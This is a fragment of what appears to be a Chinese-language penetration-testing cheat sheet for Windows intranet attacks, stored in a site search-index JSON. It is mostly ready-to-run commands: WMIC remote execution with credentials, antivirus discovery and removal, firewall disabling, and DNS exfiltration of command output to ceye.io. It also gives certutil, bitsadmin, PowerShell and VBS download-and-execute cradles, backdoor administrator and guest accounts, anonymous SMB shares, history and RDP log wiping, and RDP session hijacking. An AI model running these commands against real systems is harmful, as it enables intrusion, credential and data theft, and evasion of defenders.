/Namespace:\\\\root\\directory\\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u67e5\u57df\u5185\u6240\u6709\u673a\u5668 wmic /Namespace:\\\\root\\directory\\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u67e5\u8be2\u57df\u7684DN wmic /Namespace:\\\\root\\directory\\ldap path ds_domain get ds_distinguishedname,ds_dc \u67e5\u8be2\u8ba1\u7b97\u673a\u7528\u6237 wmic UserAccount wmic useraccount get name,sid \u67e5\u8be2BIOS-\u7528\u6765\u5224\u65ad\u865a\u62df\u673a wmic BIOS \u4f7f\u7528path\u8c03\u7528win32\u7c7b wmic path Win32_bios \u67e5\u770b\u5f53\u524d\u78c1\u76d8 wmic path Win32_LogicalDisk get Caption,VolumeName ping\u4e00\u4e2a\u5730\u5740\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53d1\u9001\u5305\u548c\u8fd4\u56de\u5305\u7684\u5927\u5c0f\u5224\u65ad\u662f\u5426\u6210\u529f wmic path Win32_PingStatus where Address=\"192.168.14.100\" get BufferSize,ReplySize,Timeout \u67e5\u770bIP\u5730\u5740\u76f8\u5173\u4fe1\u606f wmic path Win32_NetworkAdapterConfiguration get IPAddress,DefaultIPGateway,IPSubnet,DNSHostName,DNSDomain,MACAddress \u7ed3\u675f\u8fdb\u7a0b wmic process where processid=\"2345\" delete \u8fdc\u7a0b\u8fd0\u884c\u7a0b\u5e8f wmic /node:10.130.7.75 /user:exp1\\administrator /password:xxxx process call create c:\\360edr.exe \u7528list\u67e5\u770b\u662f\u5426\u8fd0\u884c\u6210\u529f wmic /node:10.130.7.75 /user:exp1\\administrator /password:xxxx process where name=\"chrome.exe\" get executablepath \u67e5\u770b\u78c1\u76d8 wmic logicaldisk get caption,description,drivetype,providername \u8fdc\u7a0b\u6267\u884c wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\\programdata\\test.bat wmic /node:10.130.7.75 /user:123\\administrator /password:123123 process call create c:\\360edr.exe wmic /node:192.168.17.138 process call create c:\\windows\\system32\\cmd.exe /c ipconfig > c:\\1.txt >wmic OS get Caption,CSDVersion,OSArchitecture,Version\u7cfb\u7edf\u7248\u672c >wmic service list brief \u5217\u51fa\u672c\u673a\u670d\u52a1 >wmic process list brief \u5217\u51fa\u8fdb\u7a0b >wmic process where name=\"chrome.exe\" get executablepath\u8fdb\u7a0b\u8def\u5f84 >wmic process get caption,commandline /value>>1.txt\u67e5\u8be2\u6240\u6709\u8fdb\u7a0b\u53c2\u6570 >wmic process where caption=\"svchost.exe\" get caption,commandline /value \u67e5\u8be2\u67d0\u4e2a\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 \u521b\u5efa\u8fdb\u7a0b >wmic process call create calc >wmic process call create \"C:\\shell.exe\" >wmic process call create \"shutdown.exe -r -f -t 20\" \u7ed3\u675f\u8fdb\u7a0b >wmic process where name=\"shell.exe\" call terminate >wmic process where processid=\"2345\" delete >wmic process 2345 call terminate >wmic startup list brief \u5217\u51fa\u81ea\u542f\u52a8\u7a0b\u5e8f >wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u770b\u6740\u6bd2\u8f6f\u4ef6 >wmic netuse list brief \u5217\u51fa\u5171\u4eab\u9a71\u52a8\u76d8 >wmic ntdomain list brief \u67e5\u8be2\u57df\u63a7\u5236\u5668 >wmic useraccount list brief \u5217\u51fa\u672c\u673a\u7ba1\u7406\u5458\u53caSID >wmic qfe list brief \u5217\u51fa\u8865\u4e01\u5217\u8868 >wmic share get name,path \u67e5\u770b\u5171\u4eab >wmic startup list brief\u67e5\u770b\u542f\u52a8\u9879 >wmic product get name,version \u67e5\u770b\u5b89\u88c5\u7684\u8f6f\u4ef6 >wmic product where \"name like '%360%'\" get name \u67e5\u770b\u7a0b\u5e8f\u540d >wmic product where name=\"360tray\" call uninstall \u5378\u8f7d\u7a0b\u5e8f >wmic process where \"name like '%360%'\" get name \u67e5\u627e\u8fdb\u7a0b\u5168\u540d >wmic product where name=\"360tray.exe\" call terminate \u505c\u6b62\u7a0b\u5e8f >wmic desktop get screensaversecure,screensavertimeout \u67e5\u770b\u5c4f\u4fdd \u67e5\u6740\u8f6f WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u7cfb\u7edf\u7248\u672c wmic OS wmic OS get Caption,CSName \u67e5\u7a0b\u5e8f wmic product get name,version \u5f53\u524d\u767b\u5f55\u7528\u6237 quser \u5b89\u88c5\u7684\u7a0b\u5e8f wmic product get name,version \u5f00\u8fdc\u7a0b\u8fde\u63a5\u7aef\u2f1d server 2003 & XP wmic path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f server2008/7/2012 wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call set allowtsconnections 1 wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 7\u548c2012\u53ea\u9700\u8981\u524d\u4e24\u6761\u5373\u53ef","title":"WMIC"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_2","text":"","title":"\u5bc6\u7801\u641c\u96c6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#sauroneye","text":"sharpcollection \u5feb\u901f\u641c\u7d22\u67d0\u540e\u7f00\u6216\u5185\u5bb9\u7684\u6587\u4ef6,\u901f\u5ea6\u771f\u7684\u5f88\u5feb. -f \u6307\u5b9a\u540e\u7f00,-c\u6307\u5b9a\u5185\u5bb9 SauronEye.exe -f \".txt \".doc\" -c \"pass\" \u641c\u7d22\u540d\u5b57\u53ef\u4ee5\u4f7f\u7528 dir /s /b c:\\ | findstr \u5bc6\u7801","title":"SauronEye"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#sharpdir","text":"sharpcollection \u53ef\u4ee5\u672c\u5730\u6216\u8fdc\u7a0b\u641c\u7d22","title":"SharpDir"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_3","text":"netsh firewall set opmode disable","title":"\u5173\u9632\u706b\u5899"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#uac","text":"0x0 \u65e0UAC 0x5 \u4e2d\u9632\u62a4 0x2 \u9ad8\u9632\u62a4 REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin","title":"\u662f\u5426\u5f00\u542f\u4e86UAC"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#dns","text":"cmd /c \"whoami > abcde && set /p xx=<abcde && certutil -urlcache -split -f http://123.ceye.io?a=%xx% cmd /c /v \"whoami > abcde && set /p xx=<abcde && certutil -urlcache -split -f http://123.ceye.io?a=!xx! \u957f\u547d\u4ee4\u7f16\u7801\u540e\u5e26\u51fa cmd /v /c \"whoami > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR=< temp3 && set FINAL=!MYVAR!.xxx.ceye.io && ping -n 1 !FINAL!\" && del /F temp* \u547d\u4ee4\u7f16\u7801 ipconfig > D:\\temp && certutil -encode D:\\temp D:\\temp3 && findstr /L /V \"CERTIFICATE\" D:\\temp3 > D:\\temp4 && type D:\\temp4 && del D:\\temp*","title":"\u547d\u4ee4DNS\u5916\u5e26"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#rdp","text":"","title":"RDP\u76f8\u5173"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#rdp_1","text":"\u5f00\u542f REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u67e5\u7aef\u53e3 REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDP-Tcp /v PortNumber","title":"\u5f00\u542fRDP\u670d\u52a1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#rdp_2","text":"\u76f4\u63a5\u8fd0\u884c <# .SYNOPSIS This script will list all users' RDP Connections History. First use \"reg load\" to load hive. Then read the RDP Connections History from HKEY_USERS. Last you need to use \"reg unload\" to unload hive. The script automatically implements the above operation,there is no need for a GUI. :) Author: 3gstudent@3gstudent License: BSD 3-Clause #> $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { $RegPath = \"Registry::HKEY_USERS\\\"+$User.SID+\"\\Software\\Microsoft\\Terminal Server Client\\Servers\\\" Write-Host \"User:\"$User.Name Write-Host \"SID:\"$User.SID Write-Host \"Status:\"$User.Status $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue If(!$?) { Write-Host \"[!]Not logged in\" Write-Host \"[*]Try to load Hive\" $File = \"C:\\Documents and Settings\\\"+$User.Name+\"\\NTUSER.DAT\" $Path = \"HKEY_USERS\\\"+$User.SID Write-Host \"[+]Path:\"$Path Write-Host \"[+]File:\"$File Reg load $Path $File If(!$?) { Write-Host \"[!]Fail to load Hive\" Write-Host \"[!]No RDP Connections History\" } Else { $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue If(!$?) { Write-Host \"[!]No RDP Connections History\" } Else { foreach($Name in $QueryPath) { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"Server:\"$Name Write-Host \"User:\"$User } } Write-Host \"[*]Try to unload Hive\" Start-Process powershell.exe -WindowStyle Hidden -ArgumentList \"Reg unload $Path\" } } foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"Server:\"$Name Write-Host \"User:\"$User } Catch { Write-Host \"[!]No RDP Connections History\" } } Write-Host \"----------------------------------\" }","title":"\u5bfb\u627eRDP\u7684\u8fde\u63a5\u8bb0\u5f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#kalirdp","text":"\u5217\u4e24\u4e2a\u6bd4\u8f83\u597d\u7528\u7684\uff0ckali\u81ea\u5e26\u7684 xfreerdp /v:192.168.0.20:3389 /u:administrator /p:Huawei12#$ /cert-ignore /drive:share1,/tmp rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1=/tmp","title":"Kali\u4e0b\u8fdeRDP"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#rdp_3","text":"@echo off @reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f @del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a @exit","title":"\u6e05\u9664RDP\u8bb0\u5f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_4","text":"net user test PasS@d123@pas /add \u52a0\u5165\u7ba1\u7406\u5458\u7ec4 net localgroup administrators test /add \u52a0\u5165\u8fdc\u7a0b\u684c\u9762\u7528\u6237\u7ec4 net localgroup \"remote desktop users\" test /add net user guest /active:yes && net user guest Aa123456. && net localgroup Administrators guest /add && net localgroup \"Remote Desktop Users\" guest /add","title":"\u65b0\u5efa\u7528\u6237\u76f8\u5173"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_5","text":"","title":"\u4e0b\u8f7d\u6587\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#chromium","text":"1.\u4e0b\u8f7d\u7684\u6587\u4ef6\u9700\u8981\u7f16\u7801 2.\u4e0b\u8f7d\u7684\u6587\u4ef6\u9700\u8981\u662fhtml \u5c06\u6587\u4ef6\u7f16\u7801\u540e\u7684\u5185\u5bb9\u653e\u5230HTML\u4e2d\uff0c\u5fc5\u987b\u662f\u72ec\u7acb\u884c\uff0c\u5426\u5219\u540e\u7eed\u4f1a\u6709\u95ee\u9898 <html><head></head><body> YXNmcXdmcXdmYWZhc2Zhc2Rhc2Rhc2Rhc2Q= </body></html> \u4e0b\u8f7d \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --enable-logging --disable-gpu --dump-dom \"http://1.1.1.1:8991/1.html\" > a.1 findstr\u6392\u9664html\u6807\u7b7e findstr /v \"html>\" a.1 > a.2 certutil\u8fd8\u539f\u539f\u59cb\u5185\u5bb9 certutil -decode a.2 a.3","title":"Chromium\u5185\u6838\u6d4f\u89c8\u5668\u4e0b\u8f7d"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#smbunc","text":"\u7528impacket\u5feb\u901f\u5f00\u542fsmb smbserver.py -smb2support share /tmp/1.exe windows\u547d\u4ee4\u4e0b\u8f7d\uff08\u9700\u8981\u505c\u7528\u7981\u6b62\u6765\u5bbe\u8bbf\u95ee\u7684\u7b56\u7565\uff09 Pcalua -a \\\\x.x.x.x\\share\\777.exe //\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7a0b\u5e8f\uff0c\u4f46\u6709UAC copy \\\\x.x.x.x\\share\\777.exe //\u4eceUNC\u590d\u5236\u7a0b\u5e8f \u9047\u6743\u9650\u95ee\u9898\u65f6\u53ef\u8bd5\u4e0b\u9762\u7684 REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f","title":"smb\uff08\u4ec5UNC\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#certutil","text":"http://127.0.0.1:8000/1.txt C:\\users\\public\\music\\a&echo [W]&cd&echo [Q] cmd /c certutil -urlcache -split -f http://x.x.x.x/%USERNAME%+%COMPUTERNAME%+%HOMEPATH% certutil -urlcache -split -f http://1.1.1.1:8080/ac.xml 1.xml certutil -urlcache -split -f http://1.1.1.1:7522/1.exe \"C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\\\1.exe\" \u4e0b\u8f7ddll\uff0c\u5229\u7528InstallUtil\u6267\u884c certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll \u4e0b\u8f7d\u5e76\u6267\u884c certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe certutil\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u5b58\u50a8\u4f4d\u7f6e\u662f %USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content \u67e5\u770b\u7f13\u5b58\u9879\u76ee\uff1a certutil.exe -urlcache * CertUtil -decode InFile OutFile bypass360\uff082021-7-19\uff09\uff1a certutil -urlcache -split -f crl delete certutil -urlcache -split -f http://1.1.1.1:8000 a \u4f7f\u7528\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7 \u4f7f\u7528unicode\u7f16\u7801\u7ed5\u8fc7","title":"certutil"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#bitsadmin","text":"bitsadmin /transfer myDownLoadJob /download /priority normal http://http://47.100.123.59:7522/1.exe c:\\users\\1a.exe \u4f7f\u7528\u5f15\u53f7\u7ed5\u8fc7 bitsadmin /\"t\"ransfer cc http://1.1.1.1:8000 %temp%\\a.txt","title":"bitsadmin"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#powershell","text":"powershell Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\" powershell \"Import-Module BitsTransfer;start-bitstransfer http://uee.me/crAJs cd.bat\"|cd.bat powershell (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1:8000','c:\\user\\public\\a');start-process 'c:\\download\\a.exe' powershell.exe iwr -uri 192.168.212.1:90/1 -o x \u4eceUNC\u8bfb\u53d6\u6267\u884c powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1","title":"powershell"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#ftp","text":"python\u5feb\u901f\u642d\u5efaftp python -m pyftpdlib -i 0.0.0.0 -p 21 -d . \u7279\u6b8a\u7aef\u53e3\u7684\u4e0b\u8f7d\u547d\u4ee4 (echo open 192.168.52.129 2121 & echo get get-pip.py savexxx)| ftp -A @ \u9ed8\u8ba4\u7aef\u53e3\u7684\u4e0b\u8f7d\u547d\u4ee4 echo get 1 save | ftp -A 192.168.212.1 # all works","title":"ftp"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#vbs","text":"\u5199\u5165vbs\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u552f\u4e00\u7684\u529f\u80fd\u5c31\u662f\u4e0b\u8f7d echo set a=createobject(^\"adod^\"+^\"b.stream^\"):set w=createobject(^\"micro^\"+^\"soft.xmlhttp^\"):w.open ^\"get^\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 > 1.vbs cscript\u6267\u884cvbs cscript 1.vbs http://192.168.52.129:8000/calc.exe calc.exe","title":"vbs"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#exe","text":"\u5199C#\u4ee3\u7406\uff0c\u76f4\u63a5\u7f16\u8bd1\u6210exe\uff0c\u8be5exe\u552f\u4e00\u7684\u529f\u80fd\u5c31\u662f\u4e0b\u8f7d echo using System.Net;class WebDL { static void Main(string[] args){System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);}} > 1.cs csc\u7f16\u8bd1 c:\\windows\\microsoft.net\\framework\\v4.0.30319\\csc.exe 1.cs out\u53c2\u6570\u6307\u5b9a\u8f93\u51fa\u76ee\u5f55 c:\\windows\\microsoft.net\\framework\\v3.5\\csc /out:c:\\1.exe 1.cs \u8fd0\u884c 1.exe http://192.168.52.129:8000/calc.exe calc.exe","title":"exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#cmdl32","text":"\u521b\u5efa\u4e00\u4e2asettings.txt\u914d\u7f6e\u6587\u4ef6 [Connection Manager] CMSFile=settings.txt Servicename=WindowsUpdate TunnelFile=settings.txt [Settings] UpdateUrl=http://x.x.x.x/x.exe \u6267\u884c cmdl32 /vpn /lan c:\\settings.txt \u4e0b\u8f7d\u5b8c\u91cd\u547d\u540d","title":"cmdl32"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_6","text":"\u6539\u8fdb\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u811a\u672c rem a\u6bb5\u63a2\u6d4b @echo off rem \u4fee\u6539ip\u7684\u503c\u4ee5\u6307\u5b9aa\u6bb5 setlocal enabledelayedexpansion set ip=10 for /l %%i in (0,1,255) do ( for /l %%k in (0,1,255) do ( for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find /i \"ttl=\" >> null if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! >> ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! ) ) ) ) exit rem b\u6bb5\u63a2\u6d4b @echo off setlocal enabledelayedexpansion set ip=192.168 for /l %%i in (0,1,255) do ( for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find /i \"ttl=\" >> null if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! >> bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! ) ) ) exit rem c\u6bb5\u63a2\u6d4b @echo off setlocal enabledelayedexpansion set ip=192.168.148 for /l %%k in (0,1,254) do ( @ping %ip%.%%k -w 1 -n 1| findstr \"TTL=\" >nul if !errorlevel! equ 0 (echo %ip%.%%k is alive ! >> cscan.txt ) else (echo %ip%.%%k May be not exist ! ) ) pause","title":"\u7f51\u7edc\u5185\u4e3b\u673a\u63a2\u6d4b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_7","text":"\u4e0d\u7ba1\u662fpowershell\u8fd8\u662fcmd\uff0c\u80fd\u591f\u8bfb\u53d6\u7684\u5386\u53f2\u547d\u4ee4\u4ec5\u9650\u4e8e\u5f53\u524d\u7a97\u53e3\uff0c\u5f53\u524d\u7a97\u53e3\u5173\u95ed\u540e\u4f1a\u81ea\u52a8\u6e05\u9664\uff0c\u65e0\u6cd5\u8bfb\u53d6 \u67e5\u770b cmd>doskey /h poershell>Get-History | Format-List -Property * \u6e05\u7a7a cmd>doskey /reinstall powershell>Clear-History","title":"\u5386\u53f2\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_8","text":"\u901a\u8fc7\u4fee\u6539\u4e8b\u4ef6ID\u6765\u67e5\u8be2\u4e0d\u540c\u767b\u5f55\u4e8b\u4ef6 $Events = Get-WinEvent -LogName \"security\" -FilterXPath \"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]\" ForEach ($Event in $Events) { $eventXML = [xml]$Event.ToXml() For ($i=0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) { Add-Member -InputObject $Event -MemberType NoteProperty -Force -Name $eventXML.Event.EventData.Data[$i].name -Value $eventXML.Event.EventData.Data[$i].'#text' } } $events|select ipaddress","title":"\u4e00\u952e\u67e5\u8be2\u65e5\u5fd7\u767b\u5f55\u4e8b\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#smb","text":"mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous` logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f","title":"\u4e00\u952e\u5f00\u542fsmb\u533f\u540d\u8bbf\u95ee"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_9","text":"\u67e5\u8be2\uff0c0\u4e3a\u5173\u95ed\uff0c1\u4e3a\u5f00\u542f reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\Power /v HibernateEnabled \u4fee\u6539 reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\Power /v HibernateEnabled /t reg_dword /d 0","title":"\u8ba1\u7b97\u673a\u4f11\u7720"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#workfolders","text":"workfolders\u547d\u4ee4\u4f1a\u6267\u884c\u5f53\u524d\u76ee\u5f55\u4e0b\u7684control.exe C:\\Users\\ede>copy c:\\windows\\system32\\calc.exe control.exe \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\ede>workfolders C:\\Users\\ede>","title":"\u5229\u7528workfolders\u6267\u884c\u7a0b\u5e8f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#at","text":"at \\\\192.168.1.1 10:00 calc.exe SCHTASKS /Create /S 1.1.1.1 /U doamin\\test /P \"123123..\" /SC ONCE /ST 11:00 /TN test1 /TR c:\\1.exe /RU system \u6839\u636e\u6761\u4ef6\u67e5\u627e\u6587\u4ef6 Get-ChildItem -Path 'e:' -Recurse -Include *.exe -ErrorAction:SilentlyContinue | Where-Object -FilterScript {($_.LastWriteTime -gt '2022-05-14') -and ($_.Length -le 10mb)}","title":"AT\u8ba1\u5212\u4efb\u52a1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#powershell_1","text":"\u83b7\u53d6\u5f53\u524d\u7b56\u7565 Get-ExecutionPolicy Restricted\uff1a\u7981\u6b62\u8fd0\u884c\u4efb\u4f55\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u3002 AllSigned \uff1a\u53ef\u4ee5\u8fd0\u884c\u811a\u672c\uff0c\u4f46\u8981\u6c42\u6240\u6709\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u7531\u53ef\u4fe1\u53d1\u5e03\u8005\u7b7e\u540d\uff0c\u5305\u62ec\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7f16\u5199\u7684\u811a\u672c\u3002 RemoteSigned \uff1a\u53ef\u4ee5\u8fd0\u884c\u811a\u672c\uff0c\u4f46\u8981\u6c42\u4ece\u7f51\u7edc\u4e0a\u4e0b\u8f7d\u7684\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u7531\u53ef\u4fe1\u53d1\u5e03\u8005\u7b7e\u540d\uff1b \u4e0d\u8981\u6c42\u5bf9\u5df2\u7ecf\u8fd0\u884c\u548c\u5df2\u5728\u672c\u5730\u8ba1\u7b97\u673a\u7f16\u5199\u7684\u811a\u672c\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002 Unrestricted \uff1a\u53ef\u4ee5\u8fd0\u884c\u672a\u7b7e\u540d\u811a\u672c\u3002\uff08\u5371\u9669\uff01\uff09 \u8bbe\u7f6e\u7b56\u7565 Set-ExecutionPolicy XXX \u7ed5\u8fc7 powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\Music\\PowerView.ps1; Get-ForestTrust}\"","title":"Powershell\u7684\u8fd0\u884c\u7b56\u7565\u53ca\u7ed5\u8fc7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#windows-pipe","text":"[System.IO.Directory]::GetFiles(\"\\\\.\\\\pipe\\\\\") \u8fdc\u7a0b auxiliary/scanner/smb/pipe_auditor msf\u8fd9\u4e2a\u63d2\u4ef6\u9700\u8981\u8ba4\u8bc1 rpcdump.py 192.168.14.100 \u8fd9\u4e2a\u4e0d\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u8bbf\u95ee\u672a\u6388\u6743\u7684\u4e1c\u897f","title":"\u67e5\u770bWindows PIPE"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#system","text":"psexec.exe -accepteula -s -i -d cmd.exe","title":"\u83b7\u53d6system"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#rdp_4","text":"\u524d\u63d0\u662f\u6709\u5176\u4ed6\u7528\u6237\u7684\u4f1a\u8bdd\u4e14\u662f\u6fc0\u6d3b\u7684\uff0c\u53ef\u4ee5\u65e0\u89c6\u5176\u4ed6\u7528\u6237\u662f\u4e0d\u662f\u9501\u5c4f\u3002 \u5207\u6362\u5230system \u9ad8\u6743\u9650\u4e0b\u53ef\u4ee5\u7528 sc create rdp binpath= \"cmd.exe /k tscon 2 /dest:console\" \u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5207\uff0c\u4f46\u662f\u53d7\u9650\u4e8e\u7cfb\u7edf\u7248\u672c\u3002 \u9ad8\u6743\u9650\u53ef\u4ee5\u7528Windows\u5b98\u65b9\u7684psexec\u5b9e\u73b0 psexec.exe -accepteula -s -i -d cmd.exe \u3002 